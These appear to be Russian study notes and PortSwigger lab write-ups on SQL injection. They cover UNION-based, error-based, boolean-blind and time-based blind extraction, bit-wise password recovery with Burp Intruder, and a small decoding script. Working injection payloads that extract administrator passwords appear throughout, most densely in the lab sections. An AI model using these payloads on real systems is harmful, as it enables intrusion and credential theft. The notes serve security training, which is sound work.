# Введение

Уязвимости SQL-инъекций могут возникать в любой точке запроса и в разных типах запросов. Некоторые другие распространённые места, где возникает SQL-инъекция:

- В операторах `UPDATE`, внутри обновлённых значений или `WHERE` условиях. 
- В операторах `INSERT`, внутри вставленных значений. 
- В операторах `SELECT`, внутри названия таблицы или столбца. 
- В операторах `SELECT`, внутри `ORDER BY`. 

---

# Исследование базы данных

| **Database type** | **Query**                 |
| ----------------- | ------------------------- |
| Microsoft, MySQL  | `SELECT @@version`        |
| Oracle            | `SELECT * FROM v$version` |
| PostgreSQL        | `SELECT version()`        |

---

## Перечисление содержимого базы данных

Большинство типов баз данных (кроме Oracle) имеют набор представлений, называемый информационной схемой. Это предоставляет информацию о базе данных.

Например, вы можете запросить таблицы в базе данных `information_schema.tables`: 

```sql
SELECT * FROM information_schema.tables
```

Он возвращает выходные данные, например:

```
TABLE_CATALOG	TABLE_SCHEMA	TABLE_NAME	TABLE_TYPE =====================================================
MyDatabase		dbo				Products	BASE TABLE
MyDatabase		dbo				Users		BASE TABLE 
MyDatabase		dbo				Feedback	BASE TABLE
```

Этот выход показывает, что существует три таблицы: `Products`, `Users`, и `Feedback`. 

Затем вы можете запросить столбцы отдельных таблиц в `information_schema.columns`: 

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

Он возвращает выходные данные, например:

```
TABLE_CATALOG	TABLE_SCHEMA	TABLE_NAME	COLUMN_NAME	DATA_TYPE =================================================================
MyDatabase		dbo				Users		UserId		int
MyDatabase		dbo				Users		Username	varchar
MyDatabase		dbo				Users		Password	varchar
```

Этот вывод показывает столбцы в указанной таблице и тип данных каждого столбца.

---

# Эксплуатация слепой SQL-инъекции через активацию условных ответов

```
…xyz' AND '1'='1
…xyz' AND '1'='2
```

- Первое из этих значений заставляет запрос возвращать результаты, потому что введённое условие `AND '1'='1` верно. В результате отображается сообщение «Добро пожаловать обратно». 
- Второе значение приводит к тому, что запрос не возвращает никаких результатов, поскольку введённое условие ложно. Сообщение «Добро пожаловать обратно» — это не выставлен.

Например, предположим, что существует таблица `Users`, вызываемая со столбцами `Username`, `Password`, и пользователь с именем `Administrator`. Вы можете определить пароль для этого пользователя, отправив серию вводных данных для проверки пароля по одному символу за раз. 

Для этого начните со следующего входа:

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

Это возвращает сообщение «Добро пожаловать обратно», указывающее, что введённое условие истинно, и поэтому первый символ пароля больше `m`. 

Далее мы отправляем следующий ввод:

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

Это не возвращает сообщение «Добро пожаловать обратно», указывающее на ложное условие, и поэтому первый символ пароля не превышает `t`. 

В конечном итоге мы отправляем следующий ввод, который возвращает сообщение «Добро пожаловать обратно», тем самым подтверждая, что первый символ пароля — `s`: 

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

Мы можем продолжить этот процесс, чтобы систематически определить полный пароль для пользователя `Administrator`. 

---

### **2. Слепая SQLi с ограничением времени (10 минут)**

При слепой SQLi с ограничением времени и невозможностью использовать substring (слишком медленно), пентестер должен действовать стратегически:

#### **План атаки на 10 минут:**

###### **Шаг 1: Быстрая разведка (1-2 минуты)**
```sql
-- Определение СУБД
' AND SLEEP(5)--      -- MySQL?
'; WAITFOR DELAY '0:0:5'--  -- SQL Server?
'; SELECT PG_SLEEP(5)--     -- PostgreSQL?

-- Проверка существования таблицы admins
' AND (SELECT COUNT(*) FROM admins)>=1--
```

###### **Шаг 2: Использование битовых операций вместо substring (3-4 минуты)**

```sql
-- Извлечение данных по битам (гораздо быстрее!)
' AND (ASCII(SUBSTRING(password,1,1)) & 128) = 128-- Проверяем бит 7 (128)
' AND (ASCII(SUBSTRING(password,1,1)) & 64) = 64--   Проверяем бит 6 (64)
' AND (ASCII(SUBSTRING(password,1,1)) & 32) = 32--   Проверяем бит 5 (32)
' AND (ASCII(SUBSTRING(password,1,1)) & 16) = 16--   Проверяем бит 4 (16)
' AND (ASCII(SUBSTRING(password,1,1)) & 8) = 8--     Проверяем бит 3 (8)
' AND (ASCII(SUBSTRING(password,1,1)) & 4) = 4--     Проверяем бит 2 (4)
' AND (ASCII(SUBSTRING(password,1,1)) & 2) = 2--     Проверяем бит 1 (2) 
' AND (ASCII(SUBSTRING(password,1,1)) & 1) = 1--     Проверяем бит 0 (1)
 -- для каждого бита (8 запросов на символ вместо 256)
```

**Синтаксис для Oracle:**
```sql
SELECT BITAND(ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'), 1, 1)), 128)/128 FROM dual

или

SELECT BITAND(ASCII(SUBSTR((password), 1, 1)), 128)/128 FROM users WHERE username='administrator'
```

**PostgreSQL в логических выражениях возвращает не 0 или 1, а 'f' или 't' **.

> **Классический substring (медленно): 256 запросов на символ;**
> **Битовые операции (быстро). Как работает:**
> >- Каждый символ кодируется 8 битами
> >- Оператор `&` (AND) проверяет конкретный бит
> >- По результатам 8 запросов восстанавливаем ASCII-код
> >- **Результат:** 8 запросов на символ.

**Пример для символа 'A' (ASCII 65):**
```txt
65 в двоичном: 01000001
Бит 0: 65 & 1 = 1    ✓
Бит 1: 65 & 2 = 0    ✗  
Бит 2: 65 & 4 = 0    ✗
Бит 3: 65 & 8 = 0    ✗
Бит 4: 65 & 16 = 0   ✗
Бит 5: 65 & 32 = 0   ✗
Бит 6: 65 & 64 = 64  ✓
Бит 7: 65 & 128 = 0  ✗
```

###### **Шаг 2 (альтернатива): Использование бинарного поиска (2-3 минуты)**

```sql
-- Бинарный поиск по ASCII коду
' AND (ASCII(SUBSTRING((SELECT password FROM admins LIMIT 1),1,1)) > 128)--
' AND (ASCII(SUBSTRING((SELECT password FROM admins LIMIT 1),1,1)) > 64)--
-- Каждый запрос делит пространство пополам (8 запросов на символ)
```

Дополнительно. **Определение реальной длины**:

На практике, перед извлечением данных мы сначала определяем длину:
``` sql
' AND (SELECT LENGTH(password) FROM admins LIMIT 1)=32--
```

###### **Шаг 4: Извлечение только критически важных данных (оставшееся время)**

```sql
-- Фокус на хешах паролей (первые несколько символов могут быть достаточны)
-- Если таблица небольшая - попытка извлечь все сразу через ошибку
-- Так проверяются первые 6-7 символов хеша
-- Используя словарь распространенных хешей
' AND (SELECT LEFT(password,8) FROM admins LIMIT 1)='5f4dcc3'--
' AND (SELECT 1 FROM admins WHERE username='admin' AND password LIKE '5f4dcc%')=1--
' AND (SELECT 1 FROM admins WHERE username='admin' AND password LIKE 'e10adc%')=1--
' AND (SELECT 1 FROM admins WHERE username='admin' AND password LIKE 'd8578e%')=1--

-- Извлечение только хешей (MD5, SHA1) которые можно brute-force'ить оффлайн
' AND (SELECT password FROM admins LIMIT 1) LIKE '[a-f0-9]%'--
```

**Логика LEFT():**
- Хеши паролей имеют предсказуемые паттерны
- **MD5:** 32 hex-символа, начинается с определенных значений
- **Пример:** `5f4dcc3` — начало MD5 хеша для пароля "password"
- Проверяем первые 8 символов вместо полного хеша

**Логика LIKE:**
- Вместо перебора всех символов проверяем распространенные хеши
- **Пример словаря:**
    - `5f4dcc3` (password), `e10adc3` (123456), `d8578ed` (password123)
- Если знаем, что используется MD5/SHA1 — проверяем только hex-символы \[a-f0-9]
- Резко сокращает пространство поиска

**Эффективность:**
- Вместо 95 возможных символов → только 16 hex-символов
- Вместо перебора 256 вариантов на символ → проверка 10-20 популярных хешей

**Логика проверки формата хеша:**
- Фильтруем по формату хеша (только hex-символы)
- Если условие истинно — это точно хеш, а не plaintext пароль
- Можно brute-force оффлайн

---

# Эксплуатация слепой SQL-инъекции путём запуска условных ошибок

Чтобы понять, как это работает, предположим, что отправляются два запроса, содержащих следующие значения cookie по очереди: `TrackingId`

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

Эти вводы используют ключевое слово `CASE` для проверки условия и возврата другого выражения в зависимости от того, истинно ли оно выражение: 

- При первом вводе выражение `CASE` вычисляется до `'a'`, что не вызывает ошибки. 
- Со вторым входом он вычисляется до `1/0`, что вызывает ошибку деления на ноль. 

Если ошибка вызывает разницу в HTTP-ответе приложения, вы можете использовать это, чтобы определить, истинно ли введённое условие.

Используя этот метод, вы можете получать данные, тестируя по одному символу за раз:
``` sql
`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
```

---

# Извлечение конфиденциальных данных с помощью подробных сообщений об ошибках SQL

Иногда можно заставить приложение сгенерировать сообщение об ошибке, содержащее часть данных, возвращаемых запросом. Это фактически превращает иначе слепую уязвимость SQL-инъекций в видимую.

Вы можете использовать функцию `CAST()` для достижения этого. Он позволяет преобразовывать один тип данных в другой. Например, представьте запрос, содержащий следующее утверждение: 

```sql
CAST((SELECT example_column FROM example_table) AS int)
```

Часто данные, которые вы пытаетесь прочитать, — это строка. Попытка преобразовать их в несовместимый тип данных, например `int`, может привести к ошибке, подобной следующему: 

```
ERROR: invalid input syntax for type integer: "Example data"
```

Такой запрос может быть полезен, если ограничение символов не позволяет запускать условные ответы.

---

# Эксплуатация слепой SQL-инъекции путем запуска задержек по времени

| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| ---------- | ------------------------------------- |
| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL | `SELECT pg_sleep(10)`                 |
| MySQL      | `SELECT SLEEP(10)`                    |

Методы запуска временной задержки зависят от типа используемой базы данных. Например, на Microsoft SQL Server можно использовать следующее для проверки состояния и запуска задержки в зависимости от того, истинно ли выражение:

```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

- Первый из этих входов не вызывает задержку, потому что условие `1=2` ложно. 
- Второй вход вызывает задержку в 10 секунд, потому что условие `1=1` соответствует действительности. 

Используя этот метод, мы можем получать данные, тестируя по одному символу за раз:

```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

---

# Лабораторные

---

### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

[SQL injection - Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-retrieving-hidden-data/sql-injection/lab-retrieve-hidden-data)

```
https://*.web-security-academy.net/products?category=Gifts'+OR+1=1--
```

---

### Lab: SQL injection vulnerability allowing login bypass

https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-subverting-application-logic/sql-injection/lab-login-bypass

Login with username:
```
administrator'--
```

---

### Lab: SQL injection UNION attack, determining the number of columns returned by the query

https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-determining-the-number-of-columns-required/sql-injection/union-attacks/lab-determine-number-of-columns#

```
https://*.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,NULL,NULL--
```

---

### Lab: SQL injection UNION attack, finding a column containing text

https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-finding-columns-with-a-useful-data-type/sql-injection/union-attacks/lab-find-column-containing-text

```
https://*.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,'a',NULL--
```

---

### Lab: SQL injection UNION attack, retrieving data from other tables

[SQL injection - Lab: SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-using-a-sql-injection-union-attack-to-retrieve-interesting-data/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

```
https://*.web-security-academy.net/filter?category=Pets' UNION SELECT username,password FROM users--
```

---

### Lab: SQL injection UNION attack, retrieving multiple values in a single column

https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-retrieving-multiple-values-within-a-single-column/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

```
https://*.web-security-academy.net/filter?category=Gifts' UNION SELECT NULL,username || '~' || password FROM users--
```

---

### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-examining-the-database-in-sql-injection-attacks/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

``` 
https://*.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,@@version--%20
```

---

### Lab: SQL injection attack, listing the database contents on non-Oracle databases

https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-examining-the-database-in-sql-injection-attacks/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

```
https://*.web-security-academy.net/filter?category=Pets' UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--
```

> `users_snzbjx`

```
https://*.web-security-academy.net/filter?category=Pets' UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns--
```

>`username_ekbzum`
>`password_kiambz`

```
https://*.web-security-academy.net/filter?category=Pets' UNION SELECT username_ekbzum,password_kiambz FROM users_snzbjx--
```

> `administrator`
> `73v7efdwjhbybpfu6e5d`

---

### Lab: Blind SQL injection with conditional responses

https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-conditional-responses/sql-injection/blind/lab-conditional-responses#

```http
-- Проверка существования таблицы users
Cookie: TrackingId=r4V0ibLxkukwJhUL' AND (SELECT COUNT(*) FROM users)>=1--;
-- Проверка существования username и password в таблице users
Cookie: TrackingId=r4V0ibLxkukwJhUL' AND (SELECT COUNT(password) FROM users)>=1--;
Cookie: TrackingId=r4V0ibLxkukwJhUL' AND (SELECT COUNT(username) FROM users)>=1--;
-- Проверка существования username = administrator в таблице users
Cookie: TrackingId=r4V0ibLxkukwJhUL' AND (SELECT COUNT(*) FROM users WHERE username='administrator')>=1--;
```

> [!warning] Альтернативные оптимизированные запросы
> ```http
> Cookie: TrackingId=r4V0ibLxkukwJhUL' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name IN ('username','password'))=2--;
> ```
> или
> ```http
> Cookie: TrackingId=r4V0ibLxkukwJhUL' AND EXISTS (SELECT username, password FROM users LIMIT 1)--;
> ```


подбор длинны пароля `administrator`:
```http
--
Cookie: TrackingId=r4V0ibLxkukwJhUL' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20--;
```

intruder - подбор пароля с помощью битовых операций:

> Тип атаки: **Cluster Bomb**
> 
> Payload 1: Numbers \[1-20]
> 
> Payload 2: Simple list \[128,64,32,16,8,4,2,1]
> 
> Payload 3: Copy other payload 2

```http
--
Cookie: TrackingId=r4V0ibLxkukwJhUL' AND (SELECT ASCII(SUBSTRING(password,§1§,1)) & §1§ FROM users WHERE username='administrator')=§1§--; 
```

1. Отсортируем по возрастанию Payload 1.  
2. Во вкладке Settings готового сканирования переходим к разделу Grep - Match. Включаем его, удаляем ненужные слова, вставляем искомое (в данном случае Welcome)
3. Сохраняем таблицу. Копируем столбец Welcome, делаем из него строку. **Удаляем самый первый символ.**
4. Переводим с помощью python скрипта в нормальный вид:

> Результат: `xpsq8dkzsohudnfrcmor`
##### Скрипт перевода двоичной ASCII строки в символы 

``` python
def binary_to_text(binary_string):
    # Проверяем, что строка состоит только из 0 и 1
    if not all(c in '01' for c in binary_string):
        return "Ошибка: строка должна содержать только нули и единицы"
    # Разбиваем строку на байты (по 8 символов)
    bytes_list = [binary_string[i:i+8] for i in range(0, len(binary_string), 8)]
    # Конвертируем каждый байт в символ ASCII
    text = ''
    for byte in bytes_list:
        if len(byte) == 8:  # Игнорируем неполные байты
            decimal_value = int(byte, 2)
            text += chr(decimal_value)
    return text

if __name__ == "__main__":
    user_input = input("Введите двоичную строку: ")
    result = binary_to_text(user_input)
    print(f"Результат: {result}")
```

---

### Lab: Blind SQL injection with conditional errors

https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-conditional-errors

```http
-- проверка наличия SQL инъекции
Cookie: TrackingId=ZhBnrtBRzBgjQoAA'  # ошибка
Cookie: TrackingId=ZhBnrtBRzBgjQoAA'' # ошибки нет
Cookie: TrackingId=xyz' (SELECT '') ' # ошибка
Cookie: TrackingId=xyz'||(SELECT '')||'           # ошибка
Cookie: TrackingId=xyz' (SELECT '' FROM dual)'    # ошибка
Cookie: TrackingId=xyz'||(SELECT '' FROM dual)||' # ошибки нет
```

```http
-- проверка наличия таблицы users
Cookie: TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM=1)||';
```

Поскольку этот запрос не возвращает ошибку, можно предположить, что такая таблица существует. Обратите внимание, что условие `WHERE ROWNUM = 1` важно, чтобы не дать запросу вернуть более одной строки, что нарушит нашу конкатенацию. 

```http
-- базовая проверка error based SQLi для Oracle
Cookie: TrackingId=ZhBnrtBRzBgjQoAA'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||';
Cookie: TrackingId=ZhBnrtBRzBgjQoAA'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||';
```

```http
-- проверка существования пользователя administrator в users
Cookie: TrackingId=ZhBnrtBRzBgjQoAA'||(SELECT CASE WHEN (COUNT(*)>=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
```

```http
-- вычисляем длину пароля administrator
Cookie: TrackingId=ZhBnrtBRzBgjQoAA'||(SELECT CASE WHEN (LENGTH(password)=20) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
```

Отправляем в Intruder для подбора пароля с помощью битовых операций:

> Тип атаки: **Cluster Bomb**
> 
> Payload 1: Numbers \[1-20]
> 
> Payload 2: Simple list \[128,64,32,16,8,4,2,1]
> 
> Payload 3: Copy other payload 2

```http
-- Синтаксис для Oracle отличается от привычного функциями BITAND и SUBSTR
Cookie: TrackingId=ZhBnrtBRzBgjQoAA'||(SELECT CASE WHEN ((SELECT BITAND(ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'), §1§, 1)), §128§)/§128§ FROM dual)=0) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||';

или

Cookie: TrackingId=ZhBnrtBRzBgjQoAA'||(SELECT CASE WHEN ((SELECT BITAND(ASCII(SUBSTR((password), §1§, 1)), §128§)/§128§ FROM users WHERE username='administrator')=0) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||';
```

1. Отсортируем по возрастанию Payload 1.
2. Сохраняем таблицу выбрав только столбец "Status Code". 
3. Меняет 500 на 0 и 200 на 1, делаем из столбца строку. **Удаляем самый первый символ.**
4. Переводим с помощью python скрипта в нормальный вид:

![[PortSwigger SQL injection#Скрипт перевода двоичной ASCII строки в символы]]

> Результат: `vg1c78vrwrox6sbdpk10`

---

## Lab: Visible error-based SQL injection

https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-sql-injection-visible-error-based

```http
Cookie: TrackingId=P' AND CAST((SELECT 1) AS int)--;

ERROR: argument of AND must be type boolean, not type integer
```

```http
Cookie: TrackingId=P' AND 1=CAST((SELECT 1) AS int)--;

Ошибки нет
```

```http
Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--

ERROR: invalid input syntax for type integer: "administrator"
```

```http
Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--;

ERROR: invalid input syntax for type integer: "lsj2mutjo50nr430a39p"
```

>[!hint]
>Иногда можно использовать синтаксис `LIMIT 1,1` или `LIMIT 1 OFFSET 1` для перебора строк вывода.

---

### Lab: Blind SQL injection with time delays and information retrieval

https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-time-delays/sql-injection/blind/lab-time-delays-info-retrieval

```http
-- Узнаём БД - PostgreSQL
Cookie: TrackingId=f'||(SELECT pg_sleep(5))||';
```

```http
-- Проверяем конструкцию CASE WHEN с Time Delay

Cookie: TrackingId=f'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)||';
```

Получаем длину пароля (20):

``` http
Cookie: TrackingId=f'||(SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username='administrator')=20) THEN pg_sleep(5) ELSE pg_sleep(0) END)||';
```

Cобираем конструкцию для подбора пароля. Отправляем в Intruder для подбора пароля с помощью битовых операций:

> Тип атаки: **Cluster Bomb**
> 
> Payload 1: Numbers \[1-20]
> 
> Payload 2: Simple list \[128,64,32,16,8,4,2,1]
> 
> Payload 3: Copy other payload 2

- **Создание пула ресурсов (Resource Pool)**:
    1. Создайте новый пул или выберите существующий.
    2. Установите **Maximum concurrent requests** в значение **1**. Это гарантирует, что запросы будут отправляться по одному, исключая влияние параллелизма на время отклика.
- **Настройки (Settings)**:
    - В разделе **Request Headers** включите опцию **Update Content-Length header**.
    - В разделе **Redirections** установите **Follow redirections** в **Never** (или **On-site only**), чтобы не учитывать время редиректов в таймингах.
    
```http
Cookie: TrackingId=f'||(SELECT CASE WHEN ((ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),§1§,1))&§1§)=§1§) THEN pg_sleep(5) ELSE pg_sleep(0) END)||';
```

В итоговой таблице значения **Response received** больше установленных (в моём случае 5000) означают True (1), остальные - False (0).

>[!info]
>**Turbo Intruder**: Для очень больших объемов перебора (тысячи/миллионы запросов) стандартный Intruder может быть медленным. В этом случае можно использовать расширение **Turbo Intruder**, которое работает намного быстрее, но требует написания скрипта на Python.

1. Отсортируем по возрастанию Payload 1.
2. Сохраняем таблицу выбрав только столбец "**Response received**". 
3. Меняет числе >=5000 на 1 и <5000 на 0, делаем из столбца строку. **Удаляем самый первый символ.**
4. Переводим с помощью python скрипта в нормальный вид:

![[PortSwigger SQL injection#Скрипт перевода двоичной ASCII строки в символы]]

> Результат: `nq7ch2bzambg3i0zza3l`

---